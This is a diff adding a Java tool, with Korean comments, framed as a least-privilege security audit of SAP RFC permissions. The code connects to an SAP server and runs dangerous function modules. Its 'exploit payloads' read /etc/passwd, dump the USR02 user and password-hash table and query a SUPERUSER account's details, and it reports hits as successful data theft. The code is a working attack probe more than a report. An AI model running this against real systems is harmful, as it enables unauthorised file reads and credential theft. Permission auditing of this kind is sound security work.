@@ -1,0 +1,112 @@
+import com.sap.conn.jco.*;
+import java.util.Properties;
+import java.io.File;
+import java.io.FileOutputStream;
+
+public class RfcFullVulnerabilityReport {
+    public static void main(String[] args) {
+        String destName = "FULL_REPORT_DEST";
+        Properties props = new Properties();
+
+        // 1. 접속 정보 (현장 정보로 수정)
+        props.setProperty("jco.client.ashost", "SAP_IP");
+        props.setProperty("jco.client.sysnr",  "00");
+        props.setProperty("jco.client.client", "100");
+        props.setProperty("jco.client.user",   "USER_ID");
+        props.setProperty("jco.client.passwd", "PASSWORD");
+
+        try {
+            createDestinationFile(destName, props);
+            JCoDestination destination = JCoDestinationManager.getDestination(destName);
+            destination.ping();
+            
+            System.out.println("======================================================");
+            System.out.println("   [최소 권한 원칙(Least Privilege) 전수 진단 결과]");
+            System.out.println("======================================================");
+
+            // [진단 세트 구성: 카테고리, 함수들...]
+            String[][] scanSet = {
+                {"[Normal] 실제 업무용 커스텀 함수", "ZFT_RFC_OUTGOING_PMT_INFO"},
+                {"[OS] OS 명령 실행 및 침투", "SXPG_COMMAND_EXECUTE", "RFC_REMOTE_EXEC"},
+                {"[File] 파일 시스템 무단 접근", "RZL_READ_FILE_LOCAL", "EPS_GET_DIRECTORY_LISTING"},
+                {"[DB] 데이터베이스 직접 조회", "RFC_READ_TABLE", "TH_DB_TABLE_INFO"},
+                {"[Auth] 권한 및 세션 정보 탈취", "TH_USER_LIST", "BAPI_USER_GET_DETAIL"}
+            };
+
+            for (String[] group : scanSet) {
+                System.out.println("\n" + group[0]);
+                for (int i = 1; i < group.length; i++) {
+                    exploitTest(destination, group[i]);
+                }
+            }
+
+        } catch (Exception e) {
+            System.err.println("[!] 연결 에러: " + e.getMessage());
+        }
+    }
+
+    public static void exploitTest(JCoDestination dest, String rfcName) {
+        try {
+            // 1단계: 메타데이터 접근
+            JCoFunction function = dest.getRepository().getFunction(rfcName);
+            if (function == null) {
+                System.out.println("  [-] " + rfcName + " : 서버에 없음 (안전)");
+                return;
+            }
+
+            // 2단계: 각 함수별 실효성 검증용 파라미터 주입 (Exploit Payload)
+            if (rfcName.equals("RZL_READ_FILE_LOCAL")) {
+                function.getImportParameterList().setValue("NAME", "/etc/passwd");
+            } else if (rfcName.equals("RFC_READ_TABLE")) {
+                function.getImportParameterList().setValue("QUERY_TABLE", "USR02"); // 사용자 계정 정보 테이블
+            } else if (rfcName.equals("BAPI_USER_GET_DETAIL")) {
+                function.getImportParameterList().setValue("USERNAME", "SUPERUSER"); // 특정 계정 정보 조회 시도
+            }
+
+            // 3단계: 실제 실행 (Execute)
+            function.execute(dest);
+            
+            // 실행 성공 시 데이터 확인 로직
+            System.out.print("  [★★★탈취 성공★★★] " + rfcName + " : 데이터 반환 완료");
+            checkResponse(function, rfcName);
+
+        } catch (JCoException e) {
+            analyzeError(rfcName, e);
+        }
+    }
+
+    private static void analyzeError(String rfcName, JCoException e) {
+        int group = e.getGroup();
+        String msg = e.getMessage();
+
+        if (group == 104) {
+            System.out.println("  [!] " + rfcName + " : [실행 거부] 정보는 노출되나 S_RFC 권한으로 실행 단계 차단됨 (과도한 권한 부여)");
+        } else if (msg.contains("required") || msg.contains("NOT_FOUND") || msg.contains("Import") || msg.contains("empty")) {
+            System.out.println("  [★실행 가능★] " + rfcName + " : [권한 열림] 실행 권한 확인됨. 파라미터 조합 시 데이터 탈취 즉시 가능");
+        } else {
+            System.out.println("  [?] " + rfcName + " : [기타 응답] " + msg);
+        }
+    }
+
+    private static void checkResponse(JCoFunction func, String rfcName) {
+        // 결과값이 있는 경우 일부 출력하여 증명
+        if (rfcName.equals("RZL_READ_FILE_LOCAL")) {
+            JCoTable table = func.getTableParameterList().getTable("FILE_TBL");
+            if (table.getNumRows() > 0) {
+                table.setRow(0);
+                System.out.println(" (Sample Data: " + table.getString("LINE") + ")");
+            }
+        } else if (rfcName.equals("ZFT_RFC_OUTGOING_PMT_INFO")) {
+             System.out.println(" (정상 업무 데이터 수신 확인)");
+        } else {
+            System.out.println(" (실행 결과 확인됨)");
+        }
+    }
+
+    static void createDestinationFile(String name, Properties props) throws Exception {
+        File destFile = new File(name + ".jcoDestination");
+        try (FileOutputStream fos = new FileOutputStream(destFile)) {
+            props.store(fos, "Security Audit Configuration");
+        }
+    }
+}
